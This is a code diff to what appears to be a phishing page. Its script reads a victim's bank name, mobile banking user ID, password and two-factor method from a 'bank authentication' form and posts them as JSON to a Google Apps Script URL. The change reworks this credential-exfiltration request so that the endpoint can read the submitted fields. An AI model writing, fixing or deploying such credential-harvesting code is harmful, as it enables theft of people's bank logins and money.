@@ -512,28 +512,29 @@
             submitButton.textContent = 'Connecting...';
             submitButton.disabled = true;
             
-            // Create FormData for Google Apps Script
-            const formData = new FormData();
-            
-            // Add all form data
-            Object.keys(data).forEach(key => {
-                formData.append(key, data[key]);
+            // Collect form data as JSON (not FormData)
+            const data = {};
+            const formData = new FormData(document.getElementById('bankAuthForm'));
+            formData.forEach((value, key) => {
+                data[key] = value;
             });
             
             // Add bank auth specific fields
-            formData.append('bankName', document.getElementById('bankName').value);
-            formData.append('mobileBankingUserId', document.getElementById('userId').value);
-            formData.append('mobileBankingPassword', document.getElementById('password').value);
-            formData.append('twoFactorMethod', document.getElementById('twoFactor').value);
-            formData.append('termsAccepted', document.getElementById('terms').checked);
-            formData.append('timestamp', new Date().toISOString());
-            formData.append('type', 'bank_authentication');
+            data.bankName = document.getElementById('bankName').value;
+            data.mobileBankingUserId = document.getElementById('userId').value;
+            data.mobileBankingPassword = document.getElementById('password').value;
+            data.twoFactorMethod = document.getElementById('twoFactor').value;
+            data.termsAccepted = document.getElementById('terms').checked;
+            data.timestamp = new Date().toISOString();
+            data.type = 'bank_authentication';
             
-            // Send to Google Apps Script using FormData (no CORS issues)
+            // Send to Google Apps Script as JSON
             fetch('https://script.google.com/macros/s/AKfycbxM0ZYTBPcLutmMdnmxO-H399LYdFfKiy6LuWkhYJb1XYxcv3SdAZH8VvPHh5Ny20S8dA/exec', {
                 method: 'POST',
-                body: formData,
-                mode: 'no-cors'
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
             })
             .then(response => response.text())
             .then(result => {
